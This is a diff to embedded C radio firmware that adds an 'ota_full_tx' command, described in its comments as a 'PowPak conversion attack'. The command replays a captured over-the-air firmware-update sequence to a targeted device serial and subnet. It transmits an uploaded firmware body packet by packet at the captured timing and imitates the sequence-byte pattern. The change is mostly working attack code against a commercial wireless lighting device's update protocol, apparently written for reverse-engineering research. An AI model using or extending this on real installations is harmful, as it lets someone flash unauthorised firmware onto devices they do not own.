@@ -14,6 +14,7 @@
 #include "cca_protocol.h"
 #include "cca_crc.h"
 #include "cca_encoder.h"
+#include "cca_ota_session.h"
 #include "cca_ota_tx.h"
 #include "cca_types.h"
 #include "cca_task.h"
@@ -1422,6 +1423,68 @@ static void exec_ota_begin(uint32_t target_serial, uint16_t subnet, uint8_t dura
 }
 
 /* -----------------------------------------------------------------------
+ * Synth-OTA full TX — Phase 2b PowPak conversion attack.
+ *
+ * Walks the LDF body in cca_ota_session via cca_ota_full_tx_walk, sending
+ * each packet (BeginTransfer, TransferData× chunks, ChangeAddrOff at page
+ * wraps) at the captured 75 ms cadence. Sequence byte is incremented per
+ * packet to mirror the captured TDMA pattern. Logs progress every 100
+ * packets via stream_broadcast_text so the host TUI sees it.
+ *
+ * The host must upload the LDF body via STREAM_CMD_OTA_UPLOAD_* first.
+ * See docs/firmware-re/powpak-conversion-attack.md.
+ * ----------------------------------------------------------------------- */
+struct OtaFullTxCtx {
+    uint32_t count;
+    uint8_t  seq;
+};
+
+static void ota_full_tx_send(const uint8_t* pkt, size_t len, void* ctx_v)
+{
+    OtaFullTxCtx* ctx = (OtaFullTxCtx*)ctx_v;
+    uint8_t buf[64];
+    if (len > sizeof(buf)) return;
+    memcpy(buf, pkt, len);
+    /* Drop a sequence byte at offset 1 — same wrap-around pattern as
+     * exec_ota_begin (seq 0x01..0x47 in steps of 6). */
+    buf[1] = ctx->seq;
+
+    cc1101_stop_rx();
+    transmit_one(buf, len);
+    cc1101_start_rx();
+
+    ctx->count++;
+    ctx->seq = (uint8_t)(ctx->seq + 6);
+    if (ctx->seq >= 0x48) ctx->seq = 0x01;
+
+    if ((ctx->count % 100) == 0) {
+        char line[80];
+        int n = snprintf(line, sizeof(line), "[cca] ota-full-tx progress: %lu pkts", (unsigned long)ctx->count);
+        if (n > 0) stream_broadcast_text(line, (size_t)n);
+    }
+
+    /* Captured cadence ~75 ms between packets (DVRF-6L OTA average). */
+    vTaskDelay(pdMS_TO_TICKS(75));
+}
+
+static void exec_ota_full_tx(uint16_t subnet, uint32_t target_serial)
+{
+    if (!cca_ota_session_complete()) {
+        printf("[cca] CMD ota_full_tx — session not complete (%lu/%lu bytes); upload LDF body first\r\n",
+               (unsigned long)cca_ota_session_body_len(), (unsigned long)cca_ota_session_expected_len());
+        return;
+    }
+    printf("[cca] CMD ota_full_tx serial=%08X subnet=%04X body=%lu bytes\r\n", (unsigned)target_serial, subnet,
+           (unsigned long)cca_ota_session_body_len());
+
+    OtaFullTxCtx ctx = {0, 0x01};
+    cca_ota_full_tx_walk(subnet, target_serial, ota_full_tx_send, &ctx);
+
+    printf("[cca] CMD ota_full_tx complete (%lu pkts) — watch for 0x0B ACK fmt=0xEC (commit)\r\n",
+           (unsigned long)ctx.count);
+}
+
+/* -----------------------------------------------------------------------
  * Public dispatcher — called from cca_cmd_execute()
  * ----------------------------------------------------------------------- */
 void cca_pairing_execute(const CcaCmdItem* item)
@@ -1451,6 +1514,9 @@ void cca_pairing_execute(const CcaCmdItem* item)
     case CCA_CMD_OTA_BEGIN_TX:
         exec_ota_begin(item->device_id, (uint16_t)((item->raw_payload[0] << 8) | item->raw_payload[1]),
                        item->duration_sec);
+        break;
+    case CCA_CMD_OTA_FULL_TX:
+        exec_ota_full_tx((uint16_t)((item->raw_payload[0] << 8) | item->raw_payload[1]), item->device_id);
         break;
     default:
         printf("[cca] Unknown pairing command: 0x%02X\r\n", item->cmd);
